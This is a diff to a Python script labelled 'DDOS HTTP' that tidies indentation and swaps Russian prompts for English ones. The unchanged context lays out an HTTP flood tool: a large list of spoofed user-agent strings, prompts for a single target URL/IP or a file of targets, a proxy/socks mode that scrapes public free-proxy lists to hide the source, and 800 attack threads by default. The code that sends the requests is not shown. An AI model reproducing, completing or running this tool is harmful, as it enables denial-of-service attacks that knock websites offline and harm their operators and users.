@@ -29,6 +29,7 @@ DDOS HTTP
 
 
 
+
 useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
 			"Avant Browser/1.2.789rel1 (http://www.avantbrowser.com)",
 			"Baiduspider ( http://www.baidu.com/search/spider.htm)",
@@ -460,14 +461,12 @@ useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
 			"wii libnup/1.0",
 			]
 
-
-
-
 os.system("clear")
 print(Fore.GREEN+"З А Г Р У З К А....")
 time.sleep(3.5)
 os.system("clear")
 print(Fore.BLUE+"\n --Attacks Ddos--\n"+Style.RESE)
+
 
 def starturl(): # in questa funzione setto l'url per renderlo usabile per il futuro settaggio delle richieste HTTP.
 	global url
@@ -476,14 +475,16 @@ def starturl(): # in questa funzione setto l'url per renderlo usabile per il fut
 	global choice1
 	global ips
 
-        choice1 = input("\nOne target [0] or more[1] ==> ")
+	choice1 = input("\nDo you want one target [0] or more[1] > ")
 
-        if choice1 == "1":
-		ip_file = input("Insert txt file of ips ==> ")
+	if choice1 == "1":
+		ip_file = input("Insert txt file of ips > ")
 		ips = open(ip_file).readlines()
 
-         else:
-		url = input("\nСсылка URL/IP ==> ").strip()
+
+
+	else:
+		url = input("\nInsert URL/IP: ").strip()
 
 		if url == "":
 			print ("Please enter the url.")
@@ -515,7 +516,7 @@ def starturl(): # in questa funzione setto l'url per renderlo usabile per il fut
 
 def proxymode():
 	global choice2
-	choice2 = input("Proxy/socks mode? Answer 'y' to enable it: ")
+	choice2 = input("Do you want proxy/socks mode? Answer 'y' to enable it: ")
 	if choice2 == "y":
 		choiceproxysocks()
 	else:
@@ -533,7 +534,7 @@ def choiceproxysocks():
 		choiceproxysocks()
 
 def choicedownproxy():
-	choice4 = input("Download a new list of proxy? Answer 'y' to do it: ")
+	choice4 = input("Do you want to download a new list of proxy? Answer 'y' to do it: ")
 	if choice4 == "y":
 		urlproxy = "http://free-proxy-list.net/"
 		proxyget(urlproxy)
@@ -541,7 +542,7 @@ def choicedownproxy():
 		proxylist()
 
 def choicedownsocks():
-	choice4 = input("Download a new list of socks? Answer 'y' to do it: ")
+	choice4 = input("Do you want to download a new list of socks? Answer 'y' to do it: ")
 	if choice4 == "y":
 		urlproxy = "https://www.socks-proxy.net/"
 		proxyget(urlproxy)
@@ -584,7 +585,7 @@ def proxylist():
 def numthreads():
 	global threads
 	try:
-		threads = int(input("Потоки (~800 лучше) ==> "))
+		threads = int(input("Insert number of threads (800): "))
 	except ValueError:
 		threads = 800
 		print ("800 threads selected.\n")
